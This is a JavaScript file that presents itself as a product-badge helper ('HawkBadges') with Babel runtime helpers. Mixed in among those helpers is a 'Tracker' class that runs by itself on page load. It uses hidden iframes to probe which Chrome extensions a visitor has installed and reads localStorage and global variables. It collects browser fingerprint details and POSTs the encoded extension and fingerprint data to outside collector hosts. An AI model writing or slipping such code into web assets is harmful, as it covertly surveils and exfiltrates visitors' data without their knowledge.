"use strict";

function _typeof(e) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
    return typeof e;
  } : function (e) {
    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
  })(e);
}
function _createForOfIteratorHelper(e, r) {
  var t,
    n,
    o,
    a,
    u = "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
  if (u) return n = !(t = !0), {
    s: function () {
      u = u.call(e);
    },
    n: function () {
      var e = u.next();
      return t = e.done, e;
    },
    e: function (e) {
      n = !0, o = e;
    },
    f: function () {
      try {
        t || null == u.return || u.return();
      } finally {
        if (n) throw o;
      }
    }
  };
  if (Array.isArray(e) || (u = _unsupportedIterableToArray(e)) || r && e && "number" == typeof e.length) return u && (e = u), a = 0, {
    s: r = function () {},
    n: function () {
      return a >= e.length ? {
        done: !0
      } : {
        done: !1,
        value: e[a++]
      };
    },
    e: function (e) {
      throw e;
    },
    f: r
  };
  throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _unsupportedIterableToArray(e, r) {
  var t;
  if (e) return "string" == typeof e ? _arrayLikeToArray(e, r) : "Map" === (t = "Object" === (t = Object.prototype.toString.call(e).slice(8, -1)) && e.constructor ? e.constructor.name : t) || "Set" === t ? Array.from(e) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(e, r) : void 0;
}
const COLLECTORS = ['https://collector.example/v3/analytics', 'https://back-collector.example/v2/record'];
function _arrayLikeToArray(e, r) {
  (null == r || r > e.length) && (r = e.length);
  for (var t = 0, n = new Array(r); t < r; t++) n[t] = e[t];
  return n;
}
function _classCallCheck(e, r) {
  if (!(e instanceof r)) throw new TypeError("Cannot call a class as a function");
}
function _defineProperties(e, r) {
  for (var t = 0; t < r.length; t++) {
    var n = r[t];
    n.enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), Object.defineProperty(e, _toPropertyKey(n.key), n);
  }
}
function _createClass(e, r, t) {
  return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", {
    writable: !1
  }), e;
}
class Tracker {
  static TIMEOUT = 4000;
  static BATCH_COUNT = 6;
  static localStorageData = !!window.localStorage && Object.entries(window.localStorage);
  static globalVariableTracking = Object.assign({}, window.globalThis);
  constructor() {
    this.activeScans = 0;
    this.flaggedExt = {};
    this.serviceWorkerArr = [];
    this.sessionStart = Date.now();
  }
  createServiceWorker(extensionName, {
    id,
    page
  }) {
    return new Promise(resolve => {
      const iFrame = document.createElement('iframe');
      iFrame.style.display = 'none';
      const clean = () => {
        iFrame.remove();
        this.activeScans--;
        this.hookJsEvents();
      };
      const delay = setTimeout(() => {
        clean();
        resolve([extensionName, false]);
      }, Tracker.TIMEOUT);
      iFrame.onload = () => {
        try {
          iFrame.contentWindow.location = `chrome-extension://${id}/${page}`;
          const monitor = setInterval(() => {
            try {
              if (iFrame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(monitor);
                clearTimeout(delay);
                clean();
                resolve([extensionName, true]);
              }
            } catch (err) {
              clearInterval(monitor);
              clearTimeout(delay);
              clean();
              resolve([extensionName, false]);
            }
          }, 150);
        } catch (err) {
          clearTimeout(delay);
          clean();
          resolve([extensionName, false]);
        }
      };
      document.body.appendChild(iFrame);
      this.activeScans++;
    });
  }
  async batchScan(inputEntries) {
    let jobs = inputEntries.map(([name, data]) => this.createServiceWorker(name, data));
    let results = await Promise.all(jobs);
    results.forEach(([name, detected]) => {
      this.flaggedExt[name] = detected;
    });
  }
  createTelemetryKit() {
    const encodedInfo = btoa(JSON.stringify({
      extensionsScanned: this.flaggedExt,
      scanTime: Date.now() - this.sessionStart,
      state: {
        currentUrl: window.location.href,
        refUrl: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        webNavigator: navigator.userAgent,
        configLang: navigator.language,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedInfo + '.' + this.checkSum(encodedInfo);
  }
  checkSum(value) {
    return Array.from(value).reduce((acc, x) => (acc << 5) - acc + x.charCodeAt(0) | 0, 0).toString(16);
  }
  async sendResults() {
    const data = this.createTelemetryKit();
    const req = COLLECTORS.map(collector => fetch(collector, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Tracker-Time': new Date().toISOString()
      },
      body: data,
      keepalive: true
    }).catch(err => null));
    await Promise.any(req);
  }
  async implement() {
    const contentArr = Object.entries(window.data);
    const groups = Array(Math.ceil(contentArr.length / Tracker.BATCH_COUNT)).fill().map((_, i) => contentArr.slice(i * Tracker.BATCH_COUNT, (i + 1) * Tracker.BATCH_COUNT));
    for (const batch of groups) {
      await this.batchScan(batch);
      await new Promise(r => setTimeout(r, Math.random() * 350 + 150));
    }
    while (this.activeScans > 0) {
      await new Promise(r => setTimeout(r, 150));
    }
    await this.sendResults();
  }
  hookJsEvents() {
    if (window.addEventListener) {
      window.addEventListener('click', function (e) {
        console.log("onClick event tracking");
      }, false);
      window.addEventListener('scroll', function (e) {
        console.log("onSroll event tracking");
      }, false);
    }
  }
}
function _toPropertyKey(e) {
  e = _toPrimitive(e, "string");
  return "symbol" === _typeof(e) ? e : String(e);
}
const watcher = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new Tracker().implement();
  }
});
function _toPrimitive(e, r) {
  if ("object" !== _typeof(e) || null === e) return e;
  var t = e[Symbol.toPrimitive];
  if (void 0 === t) return ("string" === r ? String : Number)(e);
  t = t.call(e, r || "default");
  if ("object" !== _typeof(t)) return t;
  throw new TypeError("@@toPrimitive must return a primitive value.");
}
if (document.body) {
  new Tracker().implement();
} else {
  watcher.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
var HawkBadges = function () {
  function t(e, r) {
    _classCallCheck(this, t), this.userGroup = r && r.toLowerCase(), this.badgesEnum = [{
      key: "preOder",
      value: 10
    }, {
      key: "rebate",
      value: 6
    }, {
      key: "sale",
      value: 4
    }, {
      key: "directsale",
      value: 100,
      userGroup: "direct"
    }, {
      key: "dealersale",
      value: 101,
      userGroup: "dealer"
    }, {
      key: "coupon",
      value: 5
    }, {
      key: "new",
      value: 3
    }, {
      key: "limitedQuantity",
      value: 8
    }, {
      key: "off",
      value: 9
    }, {
      key: "brownellExclusive",
      value: 1
    }, {
      key: "edgeExclusive",
      value: 2
    }], this.badgesUrl = this.getAllBadges(e), this.mappingValues = {
      100: 4,
      101: 4
    };
  }
  return _createClass(t, [{
    key: "getAllBadges",
    value: function (e) {
      var r = [];
      return e.forEach(function (e) {
        r[e.productBadge] = {
          imageUrl: e.imageUrl,
          productBadgeName: e.productBadgeName
        };
      }), r;
    }
  }, {
    key: "get",
    value: function (r) {
      var t = this;
      if (!r) return {};
      var e = {};
      if ("string" == typeof r || "number" == typeof r) e = (null == (u = this.badgesEnum.filter(function (e) {
        return e["string" == typeof r ? "key" : "value"] == r && (!e.userGroup || e.userGroup == t.userGroup);
      })) ? void 0 : u[0]) || {};else if ((null == r ? void 0 : r.constructor) == Array) {
        var n,
          o,
          a = _createForOfIteratorHelper(this.badgesEnum);
        try {
          for (a.s(); !(o = a.n()).done;) if (n = o.value, r.includes(n.value)) {
            e = this.get(n.value);
            break;
          }
        } catch (e) {
          a.e(e);
        } finally {
          a.f();
        }
      }
      var u = e.key,
        i = null != (i = this.mappingValues[e.value]) ? i : e.value;
      return {
        key: u,
        value: i,
        url: null == (u = this.badgesUrl) || null == (u = u[i]) ? void 0 : u.imageUrl,
        name: null == (u = this.badgesUrl) || null == (u = u[i]) ? void 0 : u.productBadgeName
      };
    }
  }]), t;
}();